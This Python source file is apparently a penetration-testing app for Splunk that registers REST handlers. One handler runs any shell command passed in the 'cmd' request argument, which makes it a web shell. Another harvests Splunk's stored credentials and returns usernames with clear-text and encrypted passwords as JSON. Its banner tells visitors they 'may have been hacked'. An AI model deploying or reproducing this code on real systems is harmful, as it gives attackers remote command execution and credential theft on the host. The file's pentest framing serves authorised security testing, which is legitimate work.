from splunk import auth, search
import splunk.admin
import splunk.rest
import splunk.bundle as bundle
import httplib2, urllib, os, time, json
import subprocess
import hunt_passwords
import json

class main(splunk.rest.BaseRestHandler):
    def handle_GET(self):
        self.response.setStatus(200)
        self.response.setHeader('content-type', 'text/html')
        self.response.write("Main: This is Tevora's Splunk Pentest App. If  you don't know what this is, you may have been hacked.")
class CommandHandler(splunk.rest.BaseRestHandler):

    def handle_GET(self):
        self.response.setStatus(200)
        self.response.setHeader('content-type', 'application/json')
        
        if 'cmd' not in self.args:
            self.response.write("Main: This is Tevora's Splunk Pentest App. If  you don't know what this is, you may have been hacked.")
        else:
            
            p = subprocess.Popen(self.args['cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
            self.response.write(stdout or stderr or " ")
    handle_POST = handle_GET

class PasswordHunter(splunk.rest.BaseRestHandler, splunk.admin.MConfigHandler):

    def handle_GET(self):
        self.response.setStatus(200)
        self.response.setHeader('content-type', 'application/json')
        sessionKey = self.getSessionKey()
        entities = hunt_passwords.huntPasswords(sessionKey)

        passwords ={}

        for cred, details in entities.items():
            passwords[cred] =  {'username': details['username'], 'password': details['clear_password'], 'encr_password': details['encr_password']}


        self.response.write(json.dumps(passwords))

            
    handle_POST = handle_GET
